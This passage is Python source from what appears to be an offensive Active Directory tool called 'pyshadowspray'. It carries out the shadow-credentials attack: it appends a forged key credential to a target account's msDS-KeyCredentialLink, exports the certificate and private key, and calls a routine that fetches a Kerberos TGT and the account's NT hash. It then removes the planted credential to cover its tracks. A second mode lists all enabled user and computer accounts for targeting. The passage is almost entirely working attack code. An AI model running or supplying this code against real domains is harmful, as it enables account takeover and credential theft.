                new_keycred_string = keyCredential.toDNWithBinary().toString()
                
                # Use existing_values if we found any, otherwise create new
                if existing_values:
                    # Attribute exists, append to existing values
                    new_values = existing_values + [new_keycred_string]
                    if debug:
                        print(f"[*] Appending to existing {len(existing_values)} credential(s)...")
                else:
                    # Attribute doesn't exist, create new
                    new_values = [new_keycred_string]
                    if debug:
                        print(f"[*] Creating new msDS-KeyCredentialLink attribute...")
                
                # Update the attribute (MODIFY_REPLACE works for both new and existing)
                if debug:
                    print(f"[*] Updating msDS-KeyCredentialLink attribute...")
                
                ldap_session.modify(
                    target_dn,
                    {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]}
                )
                
                if ldap_session.result['result'] == 0:
                    print(Colors.success(f"[+] Successfully added shadow credential to {target}"))
                    
                    # Get device ID string for logging/removal
                    device_id_str = keyCredential.DeviceId.toFormatD()
                    
                    # Log the addition
                    log_device_id('ADD', target, device_id_str, output_dir, success=True)
                    
                    # Verify the count
                    ldap_session.search(
                        target_dn,
                        '(objectClass=*)',
                        search_scope=ldap3.BASE,
                        attributes=['msDS-KeyCredentialLink']
                    )
                    
                    if ldap_session.entries:
                        updated_entry = ldap_session.entries[0]
                        if 'msDS-KeyCredentialLink' in updated_entry:
                            updated_values = updated_entry['msDS-KeyCredentialLink']
                            if isinstance(updated_values, list):
                                new_count = len(updated_values)
                            elif updated_values:
                                new_count = 1
                            else:
                                new_count = 0
                        else:
                            new_count = 0
                        
                        print(f"[+] New msDS-KeyCredentialLink count: {new_count}")
                    else:
                        print(f"[!] Could not verify updated count")
                    
                    # Export certificate
                    
                    export_type_upper = export_type.upper()
                    if export_type_upper not in ['PEM', 'PFX']:
                        print(f"[-] Invalid export type: {export_type}. Using PFX.")
                        export_type_upper = 'PFX'
                    
                    # Generate filename if not provided
                    if not cert_path:
                        cert_path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                        if debug:
                            print(f"[*] No filename provided, using: {cert_path}")
                    
                    # Use output directory for certificate files
                    if output_dir:
                        cert_path_full = os.path.join(output_dir, cert_path)
                    else:
                        cert_path_full = cert_path
                    
                    # Export certificate
                    if export_type_upper == "PEM":
                        certificate.ExportPEM(path_to_files=cert_path_full)
                        cert_file = f"{cert_path_full}_cert.pem"
                        key_file = f"{cert_path_full}_priv.pem"
                        print(Colors.success(f"[+] Saved PEM certificate: {cert_file}"))
                        print(Colors.success(f"[+] Saved PEM private key: {key_file}"))
                        
                        # Automatically get TGT and NT hash
                        target_domain_used = target_dom if target_dom else domain
                        asrep_key, nt_hash = get_tgt_and_nt_hash(
                            cert_file=cert_file,
                            key_file=key_file,
                            pfx_file=None,
                            pfx_password=None,
                            domain=target_domain_used,
                            dc_ip=dc_ip,
                            target_user=target,
                            output_dir=output_dir,
                            debug=debug,
                            stealth=stealth
                        )
                        
                        # Always remove credential after PKINIT attempt (regardless of success)
                        if not no_autoremove:
                            if debug:
                                print(f"[*] Auto-removing credential (DeviceID: {device_id_str})...")
                            remove_credential_by_device_id(ldap_session, target_dn, device_id_str, target, output_dir)
                    
                    elif export_type_upper == "PFX":
                        if not CRYPTOGRAPHY_AVAILABLE:
                            print(f"[-] Error: cryptography library required for PFX export")
                            print(f"[-] Install with: pip install cryptography")
                        else:
                            # Generate random password
                            cert_password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                            if debug:
                                print(f"[*] Generated random PFX password")
                            
                            # First export as PEM
                            certificate.ExportPEM(path_to_files=cert_path_full)
                            pem_cert_file = f"{cert_path_full}_cert.pem"
                            pem_key_file = f"{cert_path_full}_priv.pem"
                            pfx_file = f"{cert_path_full}.pfx"
                            password_file = f"{cert_path_full}.password"
                            
                            # Save password to file
                            with open(password_file, 'w') as f:
                                f.write(cert_password)
                            
                            # Convert to PFX
                            if debug:
                                print(f"[*] Converting PEM to PFX...")
                            
                            # Use the same function as PyWhisker
                            export_pfx_with_cryptography(
                                pem_cert_file=pem_cert_file,
                                pem_key_file=pem_key_file,
                                pfx_password=cert_password,
                                out_file=pfx_file
                            )
                            
                            print(Colors.success(f"[+] Saved PFX certificate: {pfx_file}"))
                            print(Colors.success(f"[+] PFX password saved to: {password_file}"))
                            
                            # Automatically get TGT and NT hash
                            target_domain_used = target_dom if target_dom else domain
                            asrep_key, nt_hash = get_tgt_and_nt_hash(
                                cert_file=pem_cert_file,
                                key_file=pem_key_file,
                                pfx_file=pfx_file,
                                pfx_password=cert_password,
                                domain=target_domain_used,
                                dc_ip=dc_ip,
                                target_user=target,
                                output_dir=output_dir,
                                debug=debug,
                                stealth=stealth
                            )
                            
                            # Always remove credential after PKINIT attempt (regardless of success)
                            if not no_autoremove:
                                if debug:
                                    print(f"[*] Auto-removing credential (DeviceID: {device_id_str})...")
                                remove_credential_by_device_id(ldap_session, target_dn, device_id_str, target, output_dir)
                            
                            # Clean up PEM files if requested (optional)
                            if debug:
                                print(f"[*] PEM files also saved: {pem_cert_file}, {pem_key_file}")
                else:
                    error_msg = ldap_session.result.get('message', 'Unknown error')
                    if ldap_session.result['result'] == 50:
                        print(f"[-] Insufficient rights to modify msDS-KeyCredentialLink: {error_msg}")
                    elif ldap_session.result['result'] == 19:
                        print(f"[-] Constraint violation: {error_msg}")
                    else:
                        print(f"[-] LDAP error: {error_msg}")
                    sys.exit(1)
                    
            except Exception as e:
                print(f"[-] Error adding shadow credential: {e}")
                if debug:
                    import traceback
                    traceback.print_exc()
                sys.exit(1)
        
        else:
            # Normal enumeration mode
            if debug:
                print(f"[*] Search base: {search_base}")
                print(f"[*] Querying LDAP for users and computers...")
            
            # Query for both enabled users and computers
            # Filter: (objectClass=user) AND (sAMAccountType=805306368 OR sAMAccountType=805306369) AND (account is enabled)
            # 805306368 = regular user accounts
            # 805306369 = computer accounts
            # (!(userAccountControl:1.2.840.113556.1.4.803:=2)) = account is enabled (ACCOUNTDISABLE flag not set)
            search_filter = "(&(objectClass=user)(|(sAMAccountType=805306368)(sAMAccountType=805306369))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            
            # Attributes to retrieve
            attributes = ['sAMAccountName', 'sAMAccountType']
            
            # Perform paged search
            ldap_session.extend.standard.paged_search(
                search_base,
                search_filter,
                attributes=attributes,
                paged_size=500,
                generator=False
            )
            
            # Store names in a list
            names_list = []
            
            if ldap_session.entries:
                for entry in ldap_session.entries:
                    if 'sAMAccountName' in entry:
                        sam = str(entry['sAMAccountName'])
                        # Check if it's a computer account (sAMAccountType=805306369)
                        # Computer accounts typically end with $, but we'll check the type to be sure
                        if 'sAMAccountType' in entry:
                            account_type = entry['sAMAccountType']
                            # 805306369 = computer account
                            if account_type == 805306369:
                                # Add $ suffix if not already present
                                if not sam.endswith('$'):
                                    sam = sam + '$'
                            # 805306368 = user account (no suffix needed)
                        
                        names_list.append(sam)
            
            # Output the list to stdout
            if names_list:
                if debug:
                    print(f"\n[+] Found {len(names_list)} account(s):\n")
                for name in names_list:
                    print(name)
            else:
                print("[!] No users or computers found")
        
        # Try to unbind, but ignore connection reset errors (common and harmless)
        try:
            ldap_session.unbind()
        except Exception as unbind_err:
            # Silently ignore connection reset and similar network errors during unbind
            # These are common when connections are already closed
            if debug:
                print(f"[*] Warning: Error during final LDAP unbind: {unbind_err}")
        
    except ldap3.core.exceptions.LDAPBindError as e:
        print(f"[-] LDAP bind failed: {e}")
        if debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    except Exception as e:
        # Filter out common harmless errors (connection reset during cleanup)
        error_str = str(e)
        if 'Connection reset' in error_str or 'Errno 104' in error_str or 'socket sending error' in error_str.lower():
            # These are harmless cleanup errors, ignore them
            if debug:
                print(f"[*] Warning: Connection error during cleanup (harmless): {e}")
        else:
            print(f"[-] Error: {e}")
            if debug:
                import traceback
                traceback.print_exc()
            sys.exit(1)


if __name__ == '__main__':
    app(prog_name='pyshadowspray')